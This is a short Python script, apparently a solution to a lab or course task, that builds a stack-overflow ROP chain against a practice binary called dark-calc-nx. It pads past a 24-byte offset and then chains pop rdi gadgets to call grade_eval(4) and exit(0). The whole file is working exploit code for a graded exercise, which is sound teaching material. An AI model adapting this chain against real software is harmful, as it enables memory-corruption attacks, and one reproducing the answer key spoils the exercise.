#!/usr/bin/env python3
"""Task 3: build the ROP payload for attack/dark-calc-nx (print grade_eval(4))."""
import sys

# ---- 链条上的每个 8 字节（= 整数地址的小端编码）---------------------------
POP_RDI   = b"\x79\x1a\x40\x00\x00\x00\x00\x00"   # 0x401a79  pop rdi; ret
GRADE_EVAL = b"\x78\x19\x40\x00\x00\x00\x00\x00"  # 0x401978  grade_eval
EXIT_PLT  = b"\xe0\x16\x40\x00\x00\x00\x00\x00"   # 0x4016e0  exit@plt
ARG_4     = b"\x04\x00\x00\x00\x00\x00\x00\x00"   # 4
ARG_0     = b"\x00\x00\x00\x00\x00\x00\x00\x00"   # 0

# ---- 摆链 ---------------------------------------------------------------
payload  = b"A" * 24           # 偏移 0..23   缓冲区 16 + saved rbp 8
payload += POP_RDI + ARG_4     # 偏移 24..39  rdi = 4
payload += GRADE_EVAL          # 偏移 40..47  grade_eval(4)
payload += POP_RDI + ARG_0     # 偏移 48..63  rdi = 0
payload += EXIT_PLT            # 偏移 64..71  exit(0)

sys.stdout.buffer.write(payload + b"\n")
